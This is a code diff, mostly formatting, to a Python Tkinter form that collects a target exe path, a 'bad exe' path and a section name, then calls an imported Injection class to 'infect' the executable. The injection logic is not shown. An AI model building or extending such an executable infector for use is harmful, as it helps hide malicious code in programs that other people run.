@@ -1,7 +1,10 @@
 from tkinter import *
 from tkinter import filedialog
 from injection import *
+
+
 class Form(Frame):
+
     def __init__(self, fenetre, **kwargs):
         Frame.__init__(self, fenetre, width=768, height=576, **kwargs)
         self.pack(fill=BOTH)
@@ -10,7 +13,7 @@ class Form(Frame):
         bouton = Button(self, text="Close", command=self.quit)
         bouton.pack()
 
-    def infect(self,entries):
+    def infect(self, entries):
         # period rate:
         pathToExe = entries['Path to the exe'].get()
         print('Path to the exe', pathToExe)
@@ -21,21 +24,20 @@ class Form(Frame):
         sectionName = entries['Name of the section'].get()
         print('Name of the section', sectionName)
 
-        inject = Injection(pathToExe,pathToBadExe,sectionName)
+        inject = Injection(pathToExe, pathToBadExe, sectionName)
         inject.infect()
+        label = Label(self, text=inject.new_section)
+        label.pack()
 
     def browseButton(self):
-        file = filedialog.askopenfile(mode='rb', title='Browse a file',filetypes =[('Exe files', '*.exe')])
+        file = filedialog.askopenfile(mode='rb', title='Browse a file', filetypes=[('Exe files', '*.exe')])
         if file != None:
             data = file.read()
             print(data)
             file.close()
         print(file)
 
-
-
-
-    def makeform(self,fields):
+    def makeform(self, fields):
         entries = {}
         for field in fields:
             row = Frame(self)
@@ -63,6 +65,6 @@ class Form(Frame):
         entree.pack()
         return entree
 
-    def genInput(self):
+    def result(self):
 
         return entries
